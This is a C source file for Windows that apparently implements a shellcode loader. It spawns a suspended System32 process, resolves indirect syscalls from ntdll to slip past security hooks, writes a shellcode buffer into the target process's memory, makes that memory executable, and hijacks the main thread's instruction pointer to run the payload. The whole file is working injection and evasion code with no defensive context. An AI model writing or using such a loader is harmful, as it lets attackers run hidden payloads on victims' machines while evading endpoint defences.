#include "Threading.h"

#pragma warning (disable:4996)

BOOL CreateSuspendedProcess
(
	IN LPCSTR ProcessName,
	OUT DWORD* PID,
	OUT HANDLE* hProcess,
	OUT HANDLE* hThread
)

{

	BOOL State = TRUE;

	WCHAR lpPath[MAX_PATH * 2] = { 0 };
	CHAR WnDr[MAX_PATH] = { 0 };

	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	RtlSecureZeroMemory(&si, sizeof(STARTUPINFO));
	RtlSecureZeroMemory(&pi, sizeof(PROCESS_INFORMATION));

	if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH))
	{
		WARN("GetEnvironmentVariableA Failed! With an Error: %d", GetLastError());
		return FALSE;
	}


	sprintf(lpPath, "%s\\System32\\%s", WnDr, ProcessName);


	si.cb = sizeof(STARTUPINFO);

	if (!CreateProcessA(NULL, lpPath, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
	{
		WARN("CreateProcessA Failed! With an Error: %lu", GetLastError());
		State = FALSE;
	}

	OKAY("[0x%p] Created Process: %d", pi.hProcess, pi.dwProcessId);

	*PID = pi.dwProcessId;
	*hProcess = pi.hProcess;
	*hThread = pi.hThread;

	return TRUE;

}



/*---------------------------------------------------[Externally Calling our Functions via ASM]-----------------------------------------------------------------------*/



VOID IDSC
(
	IN HMODULE ntdll,
	IN LPCSTR NtApi,
	OUT DWORD* FuncSSN,
	OUT PUINT_PTR FuncSyscall
)
{

	if (!FuncSSN || !FuncSyscall)
		return;

	UINT_PTR NtFunction = (UINT_PTR)GetProcAddress(ntdll, NtApi);
	if (!NtFunction)
	{
		WARN("Could Not Resolve Nt Function! Reason: %ld", GetLastError());
		return;
	}


	*FuncSyscall = NtFunction + 0x12;
	*FuncSSN = ((unsigned char*)NtFunction + 4)[0];

	INFO("[SSN: 0x%p] | [Syscall: 0x%p] | %s", *FuncSSN, (PVOID)*FuncSyscall, NtApi);

}



BOOL IndirectSyscallInjection
(IN HANDLE hProcess,
	IN PBYTE pShellcode,
	IN SIZE_T sSizeOfShellcode,
	OUT PVOID* ppAddress)

{

	SIZE_T sBytesWritten = NULL;
	DWORD dwOldProt = NULL;
	HMODULE    NtdllHandle = NULL;
	PVOID rBuffer = NULL;
	NTSTATUS STATUS = NULL;
	PUCHAR localBuf = NULL;
	SIZE_T origSize = sSizeOfShellcode;
	SIZE_T regionSize = sSizeOfShellcode;


	if (!hProcess || !pShellcode || sSizeOfShellcode == 0 || !ppAddress) {
		WARN("Invalid parameter to IndirectSyscallInjection");
		return FALSE;
	}


	localBuf = (PUCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sSizeOfShellcode);
	if (!localBuf) {
		WARN("HeapAlloc failed");
		return FALSE;
	}
	memcpy(localBuf, pShellcode, sSizeOfShellcode);



	NtdllHandle = GetModuleHandleW(L"ntdll.dll");
	if (NULL == NtdllHandle) {
		WARN("GetModuleHandleW", GetLastError());
		return FALSE;
	}
	OKAY("[0x%p] got the address of NTDLL!", NtdllHandle);


	IDSC(NtdllHandle, "NtAllocateVirtualMemory", &fn_NtAllocateVirtualMemorySSN, &fn_NtAllocateVirtualMemorySyscall);
	IDSC(NtdllHandle, "NtWriteVirtualMemory", &fn_NtWriteVirtualMemorySSN, &fn_NtWriteVirtualMemorySyscall);
	IDSC(NtdllHandle, "NtProtectVirtualMemory", &fn_NtProtectVirtualMemorySSN, &fn_NtProtectVirtualMemorySyscall);

	/*----------------------------------------------------------[Allocating Virtual Memory]------------------------------------------------------*/

	STATUS = NtAllocateVirtualMemory(hProcess, &rBuffer, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (STATUS != STATUS_SUCCESS)
	{
		WARN("NtAllocateVirtualMemory Failed! With an Error: 0x%0.8x", STATUS);
		HeapFree(GetProcessHeap(), 0, localBuf);
		return FALSE;
	}

	printf("Allocated \n\\____[%zu] Bytes to Virtual Memory! \n", sSizeOfShellcode);

	/*-----------------------------------------------------------[Writing Virtual Memory]------------------------------------------------------------*/

	STATUS = NtWriteVirtualMemory(hProcess, rBuffer, localBuf, origSize, &sBytesWritten);
	if (STATUS != STATUS_SUCCESS)
	{
		WARN("NtWriteVirtualMemory Failed! With an Error: 0x%0.8x", STATUS);
		HeapFree(GetProcessHeap(), 0, localBuf);
		return FALSE;
	}


	OKAY("Wrote %zu Bytes to Virtual Memory via Indirect Syscalls!", sSizeOfShellcode);

	/*----------------------------------------------------------[Changing Protecting Permissions]-----------------------------------------------------*/

	STATUS = NtProtectVirtualMemory(hProcess, &rBuffer, &origSize, PAGE_EXECUTE_READ, &dwOldProt);
	if (STATUS != STATUS_SUCCESS)
	{
		WARN("NtProtectVirtualMemory Failed! With an Error: 0x%0.8x", STATUS);
		HeapFree(GetProcessHeap(), 0, localBuf);
		return FALSE;
	}

	INFO("Changed Allocation Protection from [RW] to [RX] Via Indirect Syscalls");

	*ppAddress = rBuffer;

	HeapFree(GetProcessHeap(), 0, localBuf);
	return TRUE;

}


BOOL HijackThread
(
	IN HANDLE hThread,
	IN PVOID pRemoteAddress
)

{

	HMODULE    NtdllHandle = NULL;
	NTSTATUS		STATUS = NULL;
	ULONG suspendedCount = 0;

	CONTEXT ThreadCtx;
	RtlSecureZeroMemory(&ThreadCtx, sizeof(ThreadCtx));
	ThreadCtx.ContextFlags = CONTEXT_FULL;


	if (!hThread || hThread == INVALID_HANDLE_VALUE || !pRemoteAddress) {
		WARN("Invalid parameters to HijackThread");
		return FALSE;
	}


	NtdllHandle = GetModuleHandleW(L"ntdll.dll");
	if (NULL == NtdllHandle) {
		WARN("GetModuleHandleW", GetLastError());
		return FALSE;
	}

	IDSC(NtdllHandle, "NtGetContextThread", &fn_NtGetContextThreadSSN, &fn_NtGetContextThreadSyscall);
	IDSC(NtdllHandle, "NtSetContextThread", &fn_NtSetContextThreadSSN, &fn_NtSetContextThreadSyscall);
	IDSC(NtdllHandle, "NtResumeThread", &fn_NtResumeThreadSSN, &fn_NtResumeThreadSyscall);
	IDSC(NtdllHandle, "NtWaitForSingleObject", &fn_NtWaitForSingleObjectSSN, &fn_NtWaitForSingleObjectSyscall);


	STATUS = NtGetContextThread(hThread, &ThreadCtx);
	if (STATUS != STATUS_SUCCESS)
	{
		WARN("NtGetContextThread Failed! With an Error: 0x%0.8x", STATUS);
		return FALSE;
	}

	OKAY("Successfully got Thread Context!");

	ThreadCtx.Rip = (DWORD64)pRemoteAddress;

	STATUS = NtSetContextThread(hThread, &ThreadCtx);
	if (STATUS != STATUS_SUCCESS)
	{
		WARN("NtSetContextThread Failed! With an Error: 0x%0.8x", STATUS);
		return FALSE;
	}

	OKAY("Successfully set Thread Context!");

	STATUS = NtResumeThread(hThread, &suspendedCount);
	if (STATUS != STATUS_SUCCESS)
	{
		WARN("NtResumeThread Failed! With an Error: 0x%0.8x", STATUS);
		return FALSE;
	}

	INFO("Resuming Thread....");

	STATUS = NtWaitForSingleObject(hThread, FALSE, NULL);
	if (STATUS != STATUS_SUCCESS)
	{
		WARN("NtWaitForSingleObject Failed! With an Error: 0x%0.8x", STATUS);
		return FALSE;
	}


	INFO("Waiting for Thread to Finish Executing...");


	return TRUE;
}
